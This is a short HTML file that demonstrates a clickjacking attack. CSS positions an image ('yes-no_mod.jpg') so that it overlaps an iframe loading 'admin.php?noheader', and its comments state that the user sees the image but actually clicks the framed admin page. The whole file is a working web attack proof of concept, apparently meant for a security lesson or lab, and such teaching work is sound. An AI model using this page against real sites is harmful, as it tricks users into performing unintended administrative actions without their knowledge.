<html>
  <head>
    <style>
    iframe{
    position:absolute;
    top: 250px;
    left: 40px;
    height: 300px;
    width: 250px;
    }
    img{
    position:absolute;
    top: 0;
    left: 0;
    height: 300px;
    width: 250px;
    }
    </style>
  </head>
  <body>
    <!-- The user sees the following image-->
    <img src="yes-no_mod.jpg">
    <!-- but he effectively clicks on the following framed content -->
    <iframe src="admin.php?noheader"></iframe>
  </body>
</html>
